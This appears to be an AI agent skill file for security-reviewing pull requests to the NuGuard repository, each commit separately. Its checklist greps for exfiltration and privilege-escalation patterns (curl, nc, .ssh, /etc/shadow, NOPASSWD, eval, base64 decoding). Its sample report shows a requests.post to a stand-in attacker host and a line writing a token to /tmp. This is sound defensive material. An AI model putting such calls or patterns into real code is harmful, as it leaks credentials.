---
name: pr-security-reviewer
description: >
  Use when the user asks to review, audit, or vet a pull request (or its commits) on the
  NuGuard open-source repo for malicious or unsafe contributor behavior before merge.
  Trigger phrases: "review this PR", "audit this pull request", "vet this contributor",
  "check for malicious code", "is this PR safe to merge", "supply-chain review",
  "check for sudo/privileged commands", "check for new dependencies", "check for
  exfiltration", "check for external API calls". Produces a pass/fail checklist with
  evidence for each finding.
---

# Open-Source PR Security Reviewer

Reviews an external contributor's pull request — including every commit in it, not just the
final diff — for signs of malicious or unsafe code before it is merged into NuGuard.

## Why "every commit" matters

A malicious contributor can add something harmful in an early commit and quietly revert it in
a later one. The final diff (`gh pr diff`) hides this. Always diff **each commit individually**,
not just the PR's merge-base diff.

## Workflow

### Step 0 — Gather the PR and its commits

```bash
gh pr view <PR_NUMBER> --repo NuGuardAI/nuguard --json title,body,author,commits,files,additions,deletions,headRefName,baseRefName
gh pr diff <PR_NUMBER> --repo NuGuardAI/nuguard > /tmp/pr-full.diff
gh api repos/NuGuardAI/nuguard/pulls/<PR_NUMBER>/commits --jq '.[].sha'
```

For each commit SHA returned, fetch its individual patch so nothing is hidden by later
"cleanup" or revert commits:

```bash
gh api repos/NuGuardAI/nuguard/commits/<SHA> --jq '.files[].patch' > /tmp/commit-<SHA>.patch
```

Also check for force-pushes / history rewrites and non-matching authorship:

```bash
gh api repos/NuGuardAI/nuguard/pulls/<PR_NUMBER>/commits --jq '.[] | {sha, author: .author.login, committer: .committer.login, message: .commit.message}'
```

### Step 1 — Run the checklist against every commit's patch and the full diff

Use `grep -nE` over `/tmp/pr-full.diff` and each `/tmp/commit-*.patch` for the patterns below.
Only inspect **added** lines (diff lines starting with `+`, excluding `+++` headers).

| # | Check | What to grep / inspect | Evidence to capture |
|---|-------|------------------------|----------------------|
| 1 | No data/secret exfiltration | Outbound calls to non-allowlisted hosts combined with reads of secrets/env/keys: `requests\.(post\|put\|get)`, `httpx\.`, `urllib`, `socket\.`, `fetch\(`, `curl `, `nc `, `os\.environ`, `getenv`, `\.pem`, `\.ssh`, `api_key`, `token`, `secret` appearing near a network call or `open(...,'w')`/file write | Diff hunk + file path + line |
| 2 | No writing secrets/data to disk or unexpected files | `open\(.*['"]w` , `\.write\(`, writes outside expected output dirs (`nuguard/output`, `tests/`, `tmp/`) | Diff hunk + destination path |
| 3 | No privileged/dangerous commands | `sudo`, `su -`, `chmod 777`, `chmod -R`, `setuid`, `usermod`, `passwd`, `/etc/passwd`, `/etc/shadow`, `--privileged`, `NOPASSWD` | Diff hunk |
| 4 | No unreviewed 3rd-party package installs | Changes to `pyproject.toml`, `uv.lock`, `requirements*.txt`, `package.json`, `package-lock.json`, or inline `pip install`, `uv add`, `npm install`, `apt install`, `apt-get install` | Diff hunk + package name/version |
| 5 | No new external API calls | New hardcoded URLs/hostnames (`https?://[^\s"']+`) that aren't the existing LiteLLM/NuGuard endpoints already used in `nuguard/common/http.py` or `nuguard/common/llm_client.py` | Diff hunk + URL |
| 6 | No CI/workflow tampering | Changes under `.github/workflows/`, especially added `secrets.`, new `permissions:` grants, `pull_request_target`, disabling of required checks | Diff hunk |
| 7 | No obfuscated/dynamic code execution | `eval(`, `exec(`, `base64.b64decode`, `codecs.decode(... , 'rot13')`, `subprocess.*shell=True`, `os.system(`, `pickle.loads(` on untrusted input | Diff hunk |
| 8 | No hardcoded secrets added | High-entropy strings, `AKIA`, `sk-`, `-----BEGIN PRIVATE KEY-----`, credentials committed in code/config/tests | Diff hunk (redact the secret itself in the report) |
| 9 | No disabling of security tooling / tests | Removed/weakened `ruff`, `mypy`, test files, `--no-verify` in scripts, skipped CI jobs, lowered coverage thresholds | Diff hunk |
| 10 | No suspicious binary/executable artifacts | Added `.exe`, `.so`, `.dll`, `.bin`, minified/compiled blobs with no source | File list |
| 11 | Commit history integrity | Any add-then-revert pattern across commits; author/committer mismatch; force-push after review started | Commit list + SHAs |
| 12 | Diff matches PR description | Files/behavior changed are not explained by the PR title/body (scope creep, unrelated changes bundled in) | File list vs. PR body |

### Step 2 — Classify each finding

For every hit from Step 1, read the surrounding code (not just the grep line) to confirm it's a
real issue vs. a false positive (e.g. `sudo` appearing only in a doc string, `pip install` in a
Dockerfile comment). Only mark **FAIL** when the risky code is real and reachable/executable.

### Step 3 — Produce the report

Output a single markdown checklist. For every check mark `✅ PASS` or `❌ FAIL`. For `FAIL`,
include the exact evidence (file path, line, and the offending diff hunk in a fenced code
block). If a check could not be verified (e.g. no commit access), mark `⚠️ UNKNOWN` and say why.

```markdown
## PR Security Review — #<PR_NUMBER> "<title>"

Author: <login> · Commits reviewed: <n> · Files changed: <n>

| # | Check | Result |
|---|-------|--------|
| 1 | No data/secret exfiltration | ✅ PASS |
| 2 | No writing secrets/data to unexpected files | ❌ FAIL |
| 3 | No privileged commands (sudo, etc.) | ✅ PASS |
| 4 | No unreviewed 3rd-party package installs | ✅ PASS |
| 5 | No new external API calls | ❌ FAIL |
| 6 | No CI/workflow tampering | ✅ PASS |
| 7 | No obfuscated/dynamic code execution | ✅ PASS |
| 8 | No hardcoded secrets | ✅ PASS |
| 9 | No disabling of security tooling/tests | ✅ PASS |
| 10 | No suspicious binary artifacts | ✅ PASS |
| 11 | Commit history integrity | ✅ PASS |
| 12 | Diff matches PR description | ✅ PASS |

### Evidence for failures

**#2 — writes credentials to disk** (`nuguard/redteam/target/client.py:88`, commit `abc1234`)
​```diff
+ with open("/tmp/session_token.txt", "w") as f:
+     f.write(response.headers["Authorization"])
​```

**#5 — new external API call** (`nuguard/behavior/reporter.py:42`, commit `def5678`)
​```diff
+ requests.post("https://telemetry.example-attacker.io/collect", json=payload)
​```

### Verdict
**DO NOT MERGE** — 2 failing checks require contributor clarification or removal before merge.
```

## Important Constraints

- Never fabricate a PASS. If a check wasn't actually inspected, mark it `⚠️ UNKNOWN`.
- Always quote real diff content as evidence — never paraphrase what the code does.
- Redact actual secret values in the report; show only that a secret pattern was found and where.
- Treat test fixtures under `tests/apps/**` and `tests/fixtures/**` as lower risk but still scan
  them — planted payloads are sometimes hidden in fixture/test data.
- If `gh` cannot be used (no auth, rate-limited), fall back to a provided local clone: use
  `git log --patch <base>..<head>` per-commit and `git diff <base>...<head>` for the full diff.
